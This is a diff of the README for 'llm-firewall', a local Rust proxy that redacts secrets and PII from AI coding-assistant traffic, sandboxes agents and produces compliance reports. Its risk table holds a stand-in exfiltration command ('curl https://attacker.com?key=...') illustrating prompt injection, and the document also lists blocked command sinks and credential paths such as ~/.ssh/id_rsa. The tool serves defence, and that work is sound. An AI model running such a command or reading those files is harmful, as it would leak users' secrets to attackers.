@@ -1,42 +1,54 @@
 <div align="center">
 
-# 🛡️ `llm-firewall`
-### The Zero-Trust Security Firewall & Compliance CLI for AI Coding Assistants
+# `llm-firewall`
+### Security Firewall & Compliance Proxy for AI Coding Assistants
 
 [![Rust](https://img.shields.io/badge/rust-1.85.0%2B-orange.svg?style=flat-square&logo=rust)](https://www.rust-lang.org/)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](LICENSE)
-[![Latency](https://img.shields.io/badge/p99%20latency-%3C1ms-brightgreen.svg?style=flat-square)](#-performance--latency)
-[![Security](https://img.shields.io/badge/security-100%25%20fail--closed-red.svg?style=flat-square)](#-security-guarantees)
+[![Latency](https://img.shields.io/badge/p99%20latency-%3C1ms-brightgreen.svg?style=flat-square)](#performance-and-latency)
+[![Security](https://img.shields.io/badge/security-100%25%20fail--closed-red.svg?style=flat-square)](#security-invariants)
 [![Compliance](https://img.shields.io/badge/compliance-SOC2%20%7C%20HIPAA%20%7C%20GDPR%20%7C%20PCI--DSS-purple.svg?style=flat-square)](#5-llm-firewall-report)
 
 **Stop leaking API keys, proprietary secrets, and customer PII to external LLM providers.**  
-**`llm-firewall` is a blazing-fast, local-first proxy CLI that transparently redacts secrets before they leave your machine and safely restores them on the return trip.**
+`llm-firewall` is a local proxy CLI that redacts secrets before requests leave your machine and restores them on the return stream.
 
-[Quick Start](#-quick-start-in-30-seconds) • [CLI Commands](#-cli-command-suite) • [How It Works](#-how-it-works) • [Supported Tools](#-supported-ai-tools) • [Compliance](#-compliance-ready-audit-reports) • [Changelog](CHANGELOG.md)
+[Quick Start](#quick-start) • [Use Cases](#core-use-cases-and-deployment-modes) • [CLI Commands](#cli-commands) • [How It Works](#how-it-works) • [Supported Tools](#supported-ai-tools) • [Compliance](#5-llm-firewall-report) • [Changelog](CHANGELOG.md)
 
 ---
 
 </div>
 
-## 💥 The Problem
+## The Problem
 
-When you or your team use AI coding assistants (**Claude Code**, **Cursor**, **Copilot**, **Devin**, **AutoGPT**), complete files, prompts, and tool arguments are transmitted over the wire to cloud LLM endpoints.
+When you or your team use AI coding assistants (**Claude Code**, **Cursor**, **Copilot**, **Devin**, **OpenHands**), files, prompts, and terminal outputs are sent directly to cloud LLM providers over TLS.
 
 | Risk | Without `llm-firewall` | With `llm-firewall` |
 | :--- | :--- | :--- |
-| **API Keys & Credentials** | Leaked in prompts (`.env`, AWS, GitHub, Stripe) | 🔒 Swapped with indexed tokens (`[REDACTED_API_KEY_1]`) |
-| **Customer PII & Health Data** | Uploaded unredacted (SSNs, emails, names, MRNs) | 🔒 Redacted via 4-tier ML/NER engine |
-| **Prompt Injection Exfiltration** | Model tricked into running `curl https://evil.com?key=...` | 🚫 Rolling lookbehind quarantines dangerous sinks |
-| **Rogue Agent File Access** | Agent reads `~/.ssh/id_rsa` or `/etc/passwd` | 🚫 Strict workspace sandbox + symlink jail |
-| **Audit & Compliance** | Zero visibility into what data was exposed | 📊 Instant SOC 2, HIPAA & GDPR compliance reports |
+| **API Keys & Credentials** | Leaked in prompts (`.env`, AWS, GitHub, Stripe) | Swapped with indexed tokens (`[REDACTED_API_KEY_1]`) |
+| **Customer PII & Health Data** | Uploaded unredacted (SSNs, emails, names, MRNs) | Redacted via 4-tier ML/NER engine |
+| **Prompt Injection Exfiltration** | Model tricked into running `curl https://attacker.com?key=...` | Lookbehind scanner blocks secret re-injection into dangerous sinks |
+| **Rogue Agent File Access** | Agent reads `~/.ssh/id_rsa` or `/etc/passwd` | Strict workspace sandbox and physical path jail |
+| **Audit & Compliance** | Zero visibility into what data was exposed | Instant SOC 2, HIPAA, and GDPR audit logs |
 
 ---
 
-## ⚡ Quick Start
+## Core Use Cases and Deployment Modes
+
+| Use Case | Target Audience | How It Works |
+| :--- | :--- | :--- |
+| **Autonomous Agent Sandbox** | Users running **Claude Code**, **Cline**, **OpenHands** | Enforces a strict workspace boundary and pre-flight approval plan (`llm-firewall preflight`), blocking autonomous agents from reading `~/.ssh`, `.env`, or sensitive system files. |
+| **IDE Protection** | Developers using **Cursor**, **VS Code Copilot** | Transparent MITM proxy (`llm-firewall on`) creates trusted local certs, intercepts outbound prompts, and restores redacted values in the streaming response. |
+| **Centralized Team Gateway** | Engineering Orgs & DevOps | Run as a Docker container on your internal network. Point `OPENAI_BASE_URL` or `ANTHROPIC_BASE_URL` to the firewall to enforce company-wide secret scrubbing without changing local setups. |
+| **Prompt Injection Defense** | Security & AppSec Teams | Uses Aho-Corasick matching to block token restoration inside command execution sinks (`curl`, `wget`, `eval`, `subprocess`, `os.system`). |
+| **SOC 2, HIPAA & GDPR Audits** | CISOs & Compliance Officers | Generates immutable, timestamped audit reports (`llm-firewall report`) proving zero raw secret exposure and tracking risk avoided. |
+
+---
+
+## Quick Start
 
 ### 1. Install
 
-**Option A: Pre-compiled binaries (macOS / Linux / Windows)**
+**Option A: Pre-compiled binaries (macOS / Linux / Windows)**  
 Download the latest binary from [GitHub Releases](https://github.com/devg24/llm-firewall/releases).
 
 ```bash
@@ -59,40 +71,41 @@ cargo build --release
 sudo cp target/release/llm-firewall-rs /usr/local/bin/llm-firewall
 ```
 
-### 2. Scan your repo for risk
+### 2. Scan your repository for exposed secrets
 
 ```bash
 llm-firewall scan
 ```
 
-### 3. Turn on transparent protection
+### 3. Start transparent protection
 
 ```bash
 llm-firewall on
 ```
-> ✨ **That's it!** `llm-firewall on` automatically creates and trusts a local CA certificate, discovers your installed AI harnesses (**Cursor**, **Copilot**, **Claude Code**), patches their proxy settings, and starts intercepting traffic seamlessly.
+
+`llm-firewall on` creates and trusts a local CA certificate, configures your installed tools (**Cursor**, **Copilot**, **Claude Code**), and intercepts outbound traffic. On exit (`Ctrl+C`), it restores original settings and removes the local CA.
 
 ---
 
-## 💻 CLI Command Suite
+## CLI Commands
 
 ```text
 USAGE:
     llm-firewall [COMMAND] [OPTIONS]
 
 COMMANDS:
-    scan        Scan workspace for exposed secrets and generate a risk exposure report
-    on          Start transparent MITM proxy and auto-patch installed AI harnesses
+    scan        Scan workspace for exposed secrets and generate a risk report
+    on          Start transparent MITM proxy and configure installed tools
     preflight   Generate and approve an unattended security plan for autonomous agents
-    stats       Display real-time aggregate detection metrics and financial risk avoided
-    report      Generate audit reports mapped to SOC 2, HIPAA, GDPR, and PCI-DSS
+    stats       Display aggregate detection metrics and financial risk avoided
+    report      Generate audit reports for SOC 2, HIPAA, GDPR, and PCI-DSS
     [default]   Start standard proxy server on port 3000
 ```
 
 ---
 
 ### 1. `llm-firewall scan`
-*Run an instant, silent security audit of your codebase before running any AI tools.*
+Run a static security audit of your codebase before running AI assistants.
 
 ```bash
 llm-firewall scan
@@ -119,24 +132,24 @@ llm-firewall scan
 ---
 
 ### 2. `llm-firewall on`
-*One-command zero-config MITM firewall with automated OS trust management.*
+Start the MITM proxy with automated OS trust management.
 
 ```bash
 llm-firewall on
 ```
 
-- 🔑 Generates an ephemeral, local-only CA certificate and installs it to the OS trust store (`security add-trusted-cert` / `update-ca-certificates`).
-- 🤖 Auto-detects installed AI harnesses (**Cursor**, **VS Code Copilot**, **Claude Code**) and patches their proxy configs.
-- 🔄 Intercepts outbound requests, redacting sensitive tokens in `<1ms`.
-- 🔁 Restores original values in the inbound streaming response (SSE).
-- 🧹 **Graceful teardown**: On `Ctrl+C`, the CA cert is cleanly untrusted and original IDE settings are restored.
+- Generates an ephemeral local CA certificate and adds it to the OS trust store.
+- Discovers installed AI tools (**Cursor**, **VS Code Copilot**, **Claude Code**) and patches their proxy settings.
+- Intercepts requests and redacts sensitive tokens in under 1ms.
+- Restores original values in the return Server-Sent Events (SSE) stream.
+- **Teardown**: When stopped (`Ctrl+C`), removes the CA cert from the trust store and restores original settings.
 
 ---
 
 ### 3. `llm-firewall preflight`
-*Unattended autonomy for long-running agent workflows (Claude Code, SWE-bench, Cursor Background Agent).*
+Security plan generator for long-running autonomous agent workflows (Claude Code, SWE-bench, OpenHands).
 
-Before running an overnight or multi-hour autonomous AI coding task, pre-approve sensitive zones and lock the AI to your repository.
+Before running unattended AI coding tasks, pre-approve sensitive zones and confine the agent to your workspace.
 
 ```bash
 # Generate plan and preview sensitive zones
@@ -145,10 +158,10 @@ llm-firewall preflight
 # Auto-approve for non-interactive CI/CD pipelines
 llm-firewall preflight --yes
 
-# View existing active security plan
+# View active security plan
 llm-firewall preflight --show
 
-# Remove security plan
+# Clear security plan
 llm-firewall preflight --clear
 ```
 
@@ -175,17 +188,17 @@ llm-firewall preflight --clear
 ---
 
 ### 4. `llm-firewall stats`
-*Real-time visibility into intercepted threats and quantifiable risk avoided.*
+Inspect aggregate detection counts and calculated risk reduction.
 
 ```bash
 # View all-time detection stats
 llm-firewall stats
 
-# View past 24 hours / 7 days / 30 days
+# Filter by time window
 llm-firewall stats --since 24h
 llm-firewall stats --since 7d
 
-# Machine-readable JSON output
+# Output JSON
 llm-firewall stats --json
 ```
 
@@ -212,35 +225,35 @@ llm-firewall stats --json
 ---
 
 ### 5. `llm-firewall report`
-*Export audit-ready compliance reports for Security Teams, CISOs, and Auditors.*
+Export audit reports for compliance reviews and security teams.
 
 ```bash
-# Generate Markdown compliance report
+# Markdown report
 llm-firewall report --output compliance-audit.md
 
-# Generate structured JSON report
+# Structured JSON report
 llm-firewall report --format json --output compliance-audit.json
 
-# Include detailed individual event logs
+# Include individual event logs
 llm-firewall report --detailed --output audit-full.md
 ```
 
-#### Standard Compliance Matrix Included in Reports:
+#### Supported Compliance Frameworks
 
-| Framework | Control ID | Requirement | Firewall Technical Enforcement |
+| Framework | Control ID | Requirement | Firewall Enforcement |
 | :--- | :--- | :--- | :--- |
-| **SOC 2 Type II** | `CC6.1` | Logical Access Controls | Automatic redaction of cloud credentials, tokens, and SSH keys |
-| **SOC 2 Type II** | `CC6.6` | Boundary Protection | Path canonicalization jailing AI strictly to workspace boundary |
-| **SOC 2 Type II** | `CC6.7` | Data Transmission Protection | Zero raw secrets transmitted; reversible pseudonymization |
-| **HIPAA** | `§ 164.312(a)(1)` | Access Control & Safeguards | BERT NER redaction of patient names, identifiers, and health data |
-| **HIPAA** | `§ 164.312(e)(1)` | Transmission Security | Zero ePHI or SSN records transmitted over upstream model APIs |
-| **GDPR** | `Article 32` | Security of Processing | Reversible pseudonymization of emails, IPs, phone numbers, names |
-| **PCI-DSS v4.0** | `Req 3.3 / 3.4` | Primary Account Number Masking | Full Luhn-validated Credit Card token masking |
+| **SOC 2 Type II** | `CC6.1` | Logical Access Controls | Redaction of cloud credentials, tokens, and private keys |
+| **SOC 2 Type II** | `CC6.6` | Boundary Protection | Path canonicalization confining AI to workspace boundary |
+| **SOC 2 Type II** | `CC6.7` | Transmission Security | Reversible pseudonymization with zero raw secret transit |
+| **HIPAA** | `§ 164.312(a)(1)` | Access Safeguards | BERT NER redaction of patient names, IDs, and health data |
+| **HIPAA** | `§ 164.312(e)(1)` | Transmission Security | Zero ePHI or SSN records transmitted to external model APIs |
+| **GDPR** | `Article 32` | Security of Processing | Pseudonymization of emails, IPs, phone numbers, and names |
+| **PCI-DSS v4.0** | `Req 3.3 / 3.4` | Primary Account Masking | Luhn-validated credit card token masking |
 | **PCI-DSS v4.0** | `Req 10.2` | Automated Audit Trails | Append-only JSONL event ledger with SHA-256 integrity digest |
 
 ---
 
-## 🔬 How It Works
+## How It Works
 
 ```mermaid
 flowchart TD
@@ -255,12 +268,12 @@ flowchart TD
             T1["Tier 1: Deterministic Regex<br/>(AWS, GitHub, Stripe, SSN, CC, PII)"]
             T2["Tier 2: Contextual Shannon Entropy<br/>(API keys, Passwords, Hex Secrets)"]
             T3["Tier 3: Local BERT NER (Candle)<br/>(Contextual Names, Healthcare PII)"]
-            T4["Tier 4: ML Classifier (ORT)<br/>(Borderline Ambiguous Spans)"]
+            T4["Tier 4: ML Classifier (ORT)<br/>(Ambiguous Boundary Spans)"]
         end
 
         Jail["Sandbox & Path Validator<br/>(Physical symlink evaluation)"]
-        Map["Request-Scoped TokenMap<br/>(Zero shared global retention)"]
-        Mutator["Streaming SSE Mutator<br/>(Rolling 512-byte lookbehind sink check)"]
+        Map["Request-Scoped TokenMap<br/>(No persistent global storage)"]
+        Mutator["Streaming SSE Mutator<br/>(512-byte lookbehind sink check)"]
     end
 
     subgraph Cloud ["Upstream LLM Provider"]
@@ -268,7 +281,7 @@ flowchart TD
     end
 
     subgraph Audit ["Compliance & Telemetry"]
-        Ledger["~/.guardian/audit.jsonl<br/>(0o600 Pure-Rust Append-Only Log)"]
+        Ledger["~/.guardian/audit.jsonl<br/>(0o600 Append-Only Log)"]
     end
 
     IDE -->|1. Prompt Payload| Inbound
@@ -287,39 +300,39 @@ flowchart TD
 
 ---
 
-## 🤖 Supported AI Tools
+## Supported AI Tools
 
-| Tool | Integration Mode | Technical Mechanism | Setup |
+| Tool | Integration Mode | Mechanism | Setup |
 | :--- | :--- | :--- | :--- |
-| **Cursor** | Single-Port TCP CONNECT Tunneling | Deep `RunSSE` / `BidiAppend` payload interception with gRPC block responses | Configured automatically via `llm-firewall on` |
-| **Claude Code** | Transparent Forward Proxy | Automatic env export (`HTTP_PROXY`, `HTTPS_PROXY`) + CA trust | Configured automatically via `llm-firewall on` |
-| **GitHub Copilot** | VS Code / JetBrains Proxy | Auto-patched `http.proxy` and local certificate trust | Configured automatically via `llm-firewall on` |
-| **OpenAI / Anthropic SDKs** | Reverse Proxy Multiplexer | Set `base_url = "http://localhost:3000/v1"` (shared single port) | Zero code changes required |
+| **Cursor** | Single-Port TCP CONNECT Tunneling | Deep `RunSSE` / `BidiAppend` payload interception with inline block responses | Automated via `llm-firewall on` |
+| **Claude Code** | Transparent Forward Proxy | Sets `HTTP_PROXY` / `HTTPS_PROXY` with CA trust | Automated via `llm-firewall on` |
+| **GitHub Copilot** | VS Code / JetBrains Proxy | Configures `http.proxy` and local certificate trust | Automated via `llm-firewall on` |
+| **OpenAI / Anthropic SDKs** | Reverse Proxy Multiplexer | Set `base_url = "http://localhost:3000/v1"` | Zero code changes required |
 | **LangChain / LlamaIndex** | Standard HTTP/HTTPS Proxy | Native HTTP proxy support via single-port peeker | Set proxy env or client config |
-| **Autonomous Agents (SWE-bench, Devin)** | Sandboxed Execution | `llm-firewall preflight` + `llm-firewall on` | Strict path jail & unattended approval |
+| **Autonomous Agents (SWE-bench, Devin)** | Sandboxed Execution | `llm-firewall preflight` + `llm-firewall on` | Path jail and pre-approved plan |
 
 ---
 
-## ⚙️ Power-User Configuration (`.guardian.toml`)
+## Configuration (`.guardian.toml`)
 
-`llm-firewall` is zero-config by default, but supports repository-level tuning via `.guardian.toml`:
+`llm-firewall` works without configuration by default, but supports repository-level tuning via `.guardian.toml`:
 
 ```toml
 # Auto-detects domain profile (standard, crypto, fintech, healthcare)
 domain = "crypto"
 
 [thresholds]
-# Adjust Shannon entropy threshold (0.0 to 1.0)
+# Shannon entropy threshold (0.0 to 1.0)
 entropy_tier = 0.85
 # ML classification threshold
 classifier_tier = 0.70
 
 [allowlist]
-# Safe variables or test fixtures that should never be redacted
+# Known safe variables or test fixtures that should not be redacted
 variables = ["TEST_DUMMY_KEY", "MOCK_TOKEN_PUBLIC", "ETH_SAMPLE_ADDR"]
 
 [[custom_rules]]
-# Custom proprietary regex patterns (ReDoS validated before compilation)
+# Custom regex patterns (ReDoS-checked before compilation)
 name = "INTERNAL_PROJECT_ID"
 pattern = 'PROJ-[A-Z0-9]{8}'
 pii_type = "Custom"
@@ -327,25 +340,23 @@ pii_type = "Custom"
 
 ---
 
-## 🛡️ Security Guarantees & Architecture Invariants
+## Security Invariants
 
-* **100% Zero `unsafe` Rust**: Memory safety guaranteed by the Rust compiler.
-* **Fail-Closed by Design**: If any classifier, parser, or buffer encounters an unexpected condition, requests fail closed (`403 Forbidden` or `500 Internal Server Error`). No raw payload is ever allowed to slip past uninspected.
-* **Zero Global Retention**: The `TokenMap` is strictly instantiated per outbound request and discarded immediately after the inbound stream terminates.
-* **100% Local & Air-Gappable**: ML inference (Candle BERT & ONNX) executes entirely on-device with zero external telemetry or cloud dependencies.
-* **Sub-Millisecond p99 Overhead**: The proxy hot-path processes requests with sub-millisecond overhead.
+* **Memory Safety**: Written in Rust with memory safety enforced at compile time.
+* **Fail-Closed by Design**: If a parser, buffer, or classifier fails, the request fails closed (`403 Forbidden` or `500 Internal Server Error`). Unchecked payloads are never forwarded.
+* **Request Isolation**: The `TokenMap` is allocated per request and dropped when the response stream closes.
+* **Local ML Execution**: Candle BERT and ONNX models run locally with zero external telemetry or cloud inference dependencies.
+* **Sub-Millisecond Overhead**: Hot-path proxy processing adds under 1ms of latency.
 
 ---
 
-## 🧪 Testing & Verification
-
-Every build passes full end-to-end regression and adversarial verification:
+## Testing & Verification
 
 ```bash
 # Run all workspace unit, integration, and benchmark tests
 cargo test --workspace
 
-# Enforce strict zero-warning policy
+# Enforce zero-warning policy
 cargo clippy --workspace --all-targets -- -D warnings
 
 # Check formatting
@@ -354,23 +365,17 @@ cargo fmt --check
 
 ---
 
-## 🤝 Contributing
-
-Contributions are welcome. To contribute:
+## Contributing
 
 1. Fork the repository and create a feature branch (`git checkout -b feature/my-feature`).
-2. Make your changes and ensure all tests pass (`cargo test --workspace`).
-3. Ensure no clippy warnings or formatting issues (`cargo clippy --workspace --all-targets -- -D warnings` and `cargo fmt --check`).
-4. Commit your changes with conventional commit messages and push your branch.
-5. Open a Pull Request against `main`. All PRs must pass automated CI checks before merging.
+2. Verify all tests pass (`cargo test --workspace`).
+3. Verify linting and formatting (`cargo clippy --workspace --all-targets -- -D warnings` and `cargo fmt --check`).
+4. Commit your changes and open a Pull Request.
 
 ---
 
-## 📄 License
+## License
 
-Dual-licensed under either of:
+Dual-licensed under:
 - **MIT License** ([LICENSE-MIT](LICENSE) or [http://opensource.org/licenses/MIT](http://opensource.org/licenses/MIT))
 - **Apache License, Version 2.0** ([LICENSE-APACHE](LICENSE) or [http://www.apache.org/licenses/LICENSE-2.0](http://www.apache.org/licenses/LICENSE-2.0))
-
-at your option.
-
